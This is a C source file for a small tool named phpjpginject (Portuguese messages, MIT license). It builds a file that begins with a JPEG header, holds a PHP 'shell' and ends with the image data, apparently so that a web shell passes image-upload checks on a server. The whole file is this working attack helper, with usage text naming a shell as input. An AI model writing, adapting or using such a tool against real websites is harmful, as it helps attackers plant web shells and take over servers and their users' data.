/**************************************************************

MIT License

Copyright (c) 2018 WellingtonMiyamoto

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

----------------------------------------------------------------

> phpjpginject.c tool : v0.2
> Bug(s) corrigidos : Correção de bytes nulos após a escrita de jpgkey
> Data da finalização do script : 30/05/2018

> Reportar bugs a : wellingtonhenrique3279@gmail.com
> Blog : nopshackerspace.blogspot.com

***************************************************************/
#include <unistd.h>
#include <stdio.h>
#define ERRNOSUCHFILE "\"%s\" : Arquivo nao existente!"
#define INITREAD "inicializando leitura de %s...\n"
#define ENDREAD "leitura de %s finalizada! (%i bytes)\n"
#define MAXJPGKEY 103

void banner(void){
char ban[] ={"---------------------------------------------------------------------\n. phpjpginject.c tool : v0.2\n. Bug(s) corrigidos : Correção de bytes nulos após a escrita de jpgkey\n. Data da finalização do script : 30/05/2018\n.\n. Reportar bugs a : wellingtonhenrique3279@gmail.com\n. Blog : nopshackerspace.blogspot.com\n---------------------------------------------------------------------\n"};
printf("%s",ban);
}

int main(int argc, char *argv[]){
unsigned int jpgkey[MAXJPGKEY];
//banner();
FILE *jpg; FILE *php; FILE *shell;
unsigned int i,jpgi,phpcodei;
unsigned char ch;

if(argc < 4){fprintf(stderr,"sintaxe do script : ./phpjpginject <imagem> <shell> <arquivogerado>\n");return 0;}
if(!fopen(argv[1],"rb")){
fprintf(stderr,ERRNOSUCHFILE,argv[1]);
return -1;
}

printf(INITREAD,argv[1]);
jpg=fopen(argv[1],"rb");
fseek(jpg, MAXJPGKEY, SEEK_SET);

for(i=1; !feof(jpg); i++) ch=fgetc(jpg);

jpgi=i; rewind(jpg); fread(jpgkey,MAXJPGKEY,1,jpg);
unsigned char jpgcode[jpgi];
fread(jpgcode,jpgi,1,jpg);
fclose(jpg);
jpgi=i;i=0; ch=0;
printf(ENDREAD,argv[1],jpgi);
printf(INITREAD,argv[2]);
if(!fopen(argv[2],"rb")){
fprintf(stderr,ERRNOSUCHFILE,argv[2]);
return -1;
}

php = fopen(argv[2],"r"); for(i=1; !feof(php); i++) ch=fgetc(php);
phpcodei=i;
rewind(php); unsigned char phpcode[phpcodei];
fread(phpcode,phpcodei,1,php);
fclose(php);
phpcodei=i;i=0; ch=0;
printf(ENDREAD,argv[2],phpcodei);

shell=fopen(argv[3],"wb");
sleep(1);
printf("\n\nIniciando a gravaçao...\n\n");
sleep(1);
printf("escrevendo chave do jpg ( magic code )\n");
fwrite(jpgkey,sizeof(char),sizeof(jpgkey),shell);
printf("procedimento de escrita de \"chave jpg\" finalizazdo!\n");
printf("escrevendo phpcode...\n");
fwrite(phpcode,sizeof(char),sizeof(phpcode),shell);
printf("precedimento de escrita de codigo php finalizado!\n");
printf("escrevendo jpg...\n");
fwrite(jpgcode,sizeof(char),sizeof(jpgcode),shell);
printf("precedimento de escrita do codigo da imagem finalizado!\n");
fclose(shell);
}
